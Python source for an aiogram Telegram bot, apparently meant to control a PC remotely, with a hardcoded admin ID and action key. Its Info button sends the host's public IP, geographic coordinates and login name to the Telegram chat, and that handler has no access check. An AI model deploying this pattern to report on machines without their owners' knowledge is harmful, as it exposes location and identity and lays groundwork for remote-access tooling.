import argparse
from aiogram import Router, types, F
from aiogram.filters.command import Command, CommandObject
from aiogram.utils.keyboard import InlineKeyboardBuilder
import asyncio
import requests
import os
import getpass
import pyautogui

admin = 1639159456
action_key = "9101"

router = Router()


@router.message(Command('start'))
async def start_command(message: types.Message):
    kbd = InlineKeyboardBuilder()
    kbd.button(text="Действия", callback_data="Actions")
    kbd.button(text="Информация", callback_data="Info")
    kbd.button(text="Настройки", callback_data="Settings")
    kbd.button(text="Помощь", callback_data="Help")
    await message.answer(f"UserID: {message.from_user.id}", reply_markup=kbd.as_markup())
    

@router.callback_query(F.data == "Info")
async def info_command(callback: types.CallbackQuery):
    await callback.message.edit_text("Получение данных...")
    r = requests.get("http://ip-api.com/json/")
    data = r.json()
    if r.ok:
        await callback.message.edit_text(f"Публичный IP: `{data['query']}`\nКоординаты: `{data['lat']}, {data['lon']}`\n\nЛогин: `{getpass.getuser()}`")
        await callback.answer()
    else:
        await callback.answer("❌ Невозможно получить данные IP.", show_alert=True)
        await callback.message.edit_text(
            f"Публичный IP: `Ошибка`\nКоординаты: `Ошибка`\n\nЛогин: `{getpass.getuser()}`")

    